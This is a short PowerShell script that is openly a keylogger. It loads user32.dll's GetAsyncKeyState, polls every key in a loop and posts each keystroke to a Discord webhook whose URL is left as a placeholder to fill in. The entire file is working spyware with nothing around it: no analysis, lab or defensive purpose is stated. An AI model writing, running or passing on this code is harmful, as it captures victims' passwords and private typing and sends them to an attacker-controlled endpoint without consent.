# Placeholder webhook (replace dynamically)
$webhookUrl = "YOUR_WEBHOOK_HERE"

function Send-ToDiscord {
    param ([string]$message)

    $payload = @{ content = $message }
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json -Depth 2) -ContentType "application/json"
}

$keylogger = {
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class KeyLogger {
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);
    }
"@

    while ($true) {
        Start-Sleep -Milliseconds 40
        for ($i = 0; $i -lt 256; $i++) {
            $state = [KeyLogger]::GetAsyncKeyState($i)
            if ($state -eq -32767) {
                try {
                    $key = [char]$i
                    Send-ToDiscord -message $key
                } catch {}
            }
        }
    }
}

& $keylogger
